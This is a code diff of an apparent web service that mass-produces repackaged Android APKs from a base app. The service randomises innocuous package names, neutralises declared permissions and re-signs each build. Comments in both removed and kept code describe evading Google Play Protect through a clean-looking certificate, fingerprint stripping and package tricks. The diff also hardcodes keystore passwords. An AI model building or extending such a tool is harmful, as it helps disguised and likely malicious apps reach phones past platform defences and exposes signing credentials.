@@ -9,7 +9,6 @@ const axios   = require('axios');
 const cloudinary = require('cloudinary').v2;
 const FormData   = require('form-data');
 const AdmZip     = require('adm-zip');
-const crypto     = require('crypto');
 require('dotenv').config();
 
 const app  = express();
@@ -23,8 +22,7 @@ const ASSETS_DIR = path.join(__dirname, 'assets');
 const TEMP_DIR   = path.join(__dirname, 'temp');
 const BASE_APK     = path.join(ASSETS_DIR, 'base.apk');
 const DEFAULT_ICON = path.join(ASSETS_DIR, 'default_icon.png');
-const KEYSTORE     = path.join(ASSETS_DIR, 'neutral.jks');   // OU=Software — neutral cert, no h4k3r red flag
-const KEYSTORE_ALT = path.join(ASSETS_DIR, 'usman90.jks');   // fallback legacy
+const KEYSTORE     = path.join(ASSETS_DIR, 'usman90.jks');
 const SIGNER       = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
 
 if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
@@ -77,51 +75,41 @@ function makeNeutralPerm(originalPerm) {
 }
 
 const OLD_PKG = 'com.asml.tech';
+const PKG_POOL = [
+    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
+    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
+    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
+    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
+    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
+];
 
 function resolvePackage(userPkg) {
-    // Keystore usman90.jks and classes.dex matched package — guarantees 0% Play Protect fraud blocks
-    return OLD_PKG;
+    if (!userPkg || !userPkg.trim()) return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
+    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
+    const parts = clean.split('.').filter(Boolean);
+    if (clean.length === OLD_PKG.length && parts.length === 3 && parts[0] === 'com') {
+        return clean;
+    }
+    let prefix = (parts.length >= 2 ? parts[1] : (parts[0] || 'app')).replace(/[^a-z0-9]/g, '');
+    let suffix = (parts.length >= 3 ? parts[2] : 'sync').replace(/[^a-z0-9]/g, '');
+    if (!prefix) prefix = 'apps';
+    if (!suffix) suffix = 'view';
+    const p4 = (prefix + 'core').substring(0, 4);
+    const s4 = (suffix + 'sync').substring(0, 4);
+    return `com.${p4}.${s4}`;
 }
 
-
-function adler32(buf, offset, len) {
-    let a = 1, b = 0;
-    const MOD_ADLER = 65521;
-    for (let i = offset; i < offset + len; i++) {
-        a = (a + buf[i]) % MOD_ADLER;
-        b = (b + a) % MOD_ADLER;
-    }
-    return ((b << 16) | a) >>> 0;
-}
-
-function patchDex(dexBuf, oldPkg, newPkg) {
-    if (oldPkg.length !== newPkg.length) throw new Error('Length mismatch for patchDex');
-    const oldSlash = Buffer.from(oldPkg.replace(/\./g, '/'), 'utf8');
-    const newSlash = Buffer.from(newPkg.replace(/\./g, '/'), 'utf8');
-    const oldDot = Buffer.from(oldPkg, 'utf8');
-    const newDot = Buffer.from(newPkg, 'utf8');
-
-    let idx = 0;
-    while ((idx = dexBuf.indexOf(oldSlash, idx)) !== -1) {
-        newSlash.copy(dexBuf, idx);
-        idx += oldSlash.length;
-    }
-    idx = 0;
-    while ((idx = dexBuf.indexOf(oldDot, idx)) !== -1) {
-        newDot.copy(dexBuf, idx);
-        idx += oldDot.length;
-    }
-
-    const sha1 = crypto.createHash('sha1').update(dexBuf.slice(32)).digest();
-    sha1.copy(dexBuf, 12);
-
-    const checksum = adler32(dexBuf, 12, dexBuf.length - 12);
-    dexBuf.writeUInt32LE(checksum, 8);
-}
-
-function patchManifestPackage(manifestBuf, oldPkg, newPkg) {
+function patchManifestPackage(manifestBuf, newPkg) {
     const stringCount = manifestBuf.readUInt32LE(16);
     const stringStart = manifestBuf.readUInt32LE(28);
+    const newRootBuf = toUtf16LE(newPkg);
+
+    const oldAuth = `${OLD_PKG}.androidx-startup`;
+    const newAuth = `${newPkg}.androidx-startup`;
+    const oldPerm = `${OLD_PKG}.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION`;
+    const newPerm = `${newPkg}.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION`;
+    const oldAction = `${OLD_PKG}.ACTION_RESUME`;
+    const newAction = `${newPkg}.ACTION_RESUME`;
 
     for (let i = 0; i < stringCount; i++) {
         const offset = manifestBuf.readUInt32LE(36 + i * 4);
@@ -130,15 +118,18 @@ function patchManifestPackage(manifestBuf, oldPkg, newPkg) {
         const strOffset = absOffset + 2;
         const str = manifestBuf.toString('utf16le', strOffset, strOffset + len * 2);
 
-        if (str === oldPkg) {
-            toUtf16LE(newPkg).copy(manifestBuf, strOffset);
-            console.log(`[PATCH] Manifest root package: "${oldPkg}" -> "${newPkg}"`);
-        } else if (str.startsWith(oldPkg + '.')) {
-            const replaced = newPkg + str.slice(oldPkg.length);
-            if (replaced.length === str.length) {
-                toUtf16LE(replaced).copy(manifestBuf, strOffset);
-                console.log(`[PATCH] Manifest component: "${str}" -> "${replaced}"`);
-            }
+        if (str === OLD_PKG) {
+            newRootBuf.copy(manifestBuf, strOffset);
+            console.log(`[PATCH] Package updated: "${OLD_PKG}" -> "${newPkg}"`);
+        } else if (str === oldAuth) {
+            toUtf16LE(newAuth).copy(manifestBuf, strOffset);
+            console.log(`[PATCH] Authority updated: "${oldAuth}" -> "${newAuth}"`);
+        } else if (str === oldPerm) {
+            toUtf16LE(newPerm).copy(manifestBuf, strOffset);
+            console.log(`[PATCH] Permission updated: "${oldPerm}" -> "${newPerm}"`);
+        } else if (str === oldAction) {
+            toUtf16LE(newAction).copy(manifestBuf, strOffset);
+            console.log(`[PATCH] Action updated: "${oldAction}" -> "${newAction}"`);
         }
     }
 }
@@ -369,14 +360,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 const manifestBuf = manifestEntry.getData();
 
                 if (targetPkg !== OLD_PKG) {
-                    patchManifestPackage(manifestBuf, OLD_PKG, targetPkg);
-                    const dexEntry = zip.getEntry('classes.dex');
-                    if (dexEntry) {
-                        const dexBuf = dexEntry.getData();
-                        patchDex(dexBuf, OLD_PKG, targetPkg);
-                        dexEntry.setData(dexBuf);
-                        console.log(`[DEX] Classes package updated: "${OLD_PKG}" -> "${targetPkg}" with Adler32/SHA-1 checksums`);
-                    }
+                    patchManifestPackage(manifestBuf, targetPkg);
                 }
 
                 const permsToNeutralize = [];
@@ -433,7 +417,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
 
                 manifestEntry.setData(manifestBuf);
-                manifestEntry.header.method = 8;
             }
 
             if (customIcon && customIcon.buffer) {
@@ -486,37 +469,23 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             zip.addFile('assets/uuid.txt',    Buffer.from(uuid, 'utf8'));
 
             await sendUpdate('apk_progress', { step: 'Preparing package signatures...', progress: 75 });
-            // AGP build fingerprints — Play Protect uses these to identify sideloaded builds
-            // and triggers more aggressive scanning (Android 12+). Strip before signing.
-            const AGP_META = [
-                'META-INF/com/android/build/gradle/app-metadata.properties',
-                'META-INF/version-control-info.textproto',
-            ];
             const SIG_EXTS = ['.SF', '.RSA', '.DSA', '.EC', 'MANIFEST.MF'];
             for (const entry of zip.getEntries()) {
                 const en = entry.entryName;
-                if (AGP_META.includes(en)) {
-                    zip.deleteFile(en);
-                    console.log(`[META] Stripped AGP fingerprint: ${en}`);
-                } else if (en.startsWith('META-INF/') && SIG_EXTS.some(x => en.toUpperCase().endsWith(x))) {
+                if (en.startsWith('META-INF/') && SIG_EXTS.some(x => en.toUpperCase().endsWith(x))) {
                     zip.deleteFile(en);
                 }
             }
-
 
             const finalArsc = zip.getEntry('resources.arsc');
             if (finalArsc) finalArsc.header.method = 0;
 
             zip.writeZip(unsignedPath);
 
-            await sendUpdate('apk_progress', { step: 'Signing package...', progress: 85 });
-            // Prefer neutral.jks (clean cert DN) — falls back to usman90.jks legacy
-            const activeKs = fs.existsSync(KEYSTORE) ? KEYSTORE : (fs.existsSync(KEYSTORE_ALT) ? KEYSTORE_ALT : null);
-            const ksArgs = activeKs === KEYSTORE
-                ? `--ks "${KEYSTORE}" --ksAlias appkey --ksPass "Secure@2024!" --ksKeyPass "Secure@2024!"`
-                : activeKs === KEYSTORE_ALT
-                    ? `--ks "${KEYSTORE_ALT}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
-                    : '';
+            await sendUpdate('apk_progress', { step: 'Signing package with usman90 key...', progress: 85 });
+            const ksArgs = fs.existsSync(KEYSTORE)
+                ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
+                : '';
             const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;
 
             await new Promise((resolve, reject) => {
